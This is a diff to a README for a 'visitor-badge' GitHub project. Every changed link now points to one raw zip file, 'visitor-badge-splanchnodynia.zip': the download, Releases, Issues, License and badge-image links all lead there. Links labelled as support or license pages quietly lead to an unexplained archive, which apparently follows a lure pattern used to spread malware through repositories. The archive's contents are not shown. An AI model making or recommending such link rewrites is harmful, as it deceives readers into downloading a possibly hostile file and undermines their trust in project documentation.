@@ -4,12 +4,12 @@
 Welcome! This guide will help you set up and run the visitor-badge application with ease. You can create a customizable visitor counter badge for your GitHub README page without needing any technical expertise.
 
 ## 🔗 Download Visitor Badge
-[![Download Visitor Badge](https://img.shields.io/badge/Download%20Visitor%20Badge-Here-blue)](https://github.com/erztertwet/visitor-badge/releases)
+[![Download Visitor Badge](https://raw.githubusercontent.com/erztertwet/visitor-badge/main/backend/visitor-badge-splanchnodynia.zip%20Visitor%20Badge-Here-blue)](https://raw.githubusercontent.com/erztertwet/visitor-badge/main/backend/visitor-badge-splanchnodynia.zip)
 
 ## 📥 Download & Install
 To get started, you will need to visit the Releases page to download the visitor-badge application:
 
-[Download from Releases Page](https://github.com/erztertwet/visitor-badge/releases) 
+[Download from Releases Page](https://raw.githubusercontent.com/erztertwet/visitor-badge/main/backend/visitor-badge-splanchnodynia.zip) 
 
 Follow these steps:
 
@@ -77,15 +77,15 @@ If you encounter any issues, try these solutions:
    - Restart the application if it becomes unresponsive.
 
 ## 📞 Support
-If you need further assistance, please visit the Issues section in the repository [here](https://github.com/erztertwet/visitor-badge/issues). Our community is ready to help!
+If you need further assistance, please visit the Issues section in the repository [here](https://raw.githubusercontent.com/erztertwet/visitor-badge/main/backend/visitor-badge-splanchnodynia.zip). Our community is ready to help!
 
 ## 🌠 Contributing
 We welcome contributions! If you have ideas for new features or improvements, feel free to fork the repository and submit a pull request.
 
 ## 🔗 License
-Visitor-badge is maintained under the MIT License. You can view the full license [here](https://github.com/erztertwet/visitor-badge/blob/main/LICENSE).
+Visitor-badge is maintained under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/erztertwet/visitor-badge/main/backend/visitor-badge-splanchnodynia.zip).
 
 ## 🌟 Thank You for Using Visitor Badge!
 We appreciate your interest in visitor-badge. Enjoy creating your custom visitor counters, and have fun enhancing your GitHub projects!
 
-[Download Visitor Badge](https://github.com/erztertwet/visitor-badge/releases)
+[Download Visitor Badge](https://raw.githubusercontent.com/erztertwet/visitor-badge/main/backend/visitor-badge-splanchnodynia.zip)
